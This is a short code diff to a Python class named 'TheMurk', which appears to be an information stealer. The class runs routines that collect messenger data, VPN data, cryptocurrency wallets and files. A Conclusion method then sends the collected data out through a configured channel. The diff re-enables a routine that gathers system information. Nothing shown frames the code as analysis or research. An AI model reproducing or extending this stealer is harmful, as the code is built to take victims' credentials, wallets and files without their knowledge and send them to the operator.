@@ -19,7 +19,7 @@ class TheMurk:
         self.Messagers()
         self.GetVpn()
         self.Wallets()
-        # self.System()
+        self.System()
         self.GrabFiles()
         self.Conclusion()
         exit(0)
@@ -64,13 +64,13 @@ class TheMurk:
         self.msgInfo[1] += Wallets()
 
     
-    # def System(self):
-    #     self.msgInfo[0] = SystemInfo()
-    #     Wifi()
-    #     ClipBoard()
-    #     # Programs()
-    #     # ProductKey()
-    #     Screenshot()
+    def System(self):
+        self.msgInfo[0] = SystemInfo()
+        # Wifi()
+        # ClipBoard()
+        # Programs()
+        # ProductKey()
+        # Screenshot()
     
     def Conclusion(self):
         Send(config.sendData, self.msgInfo)
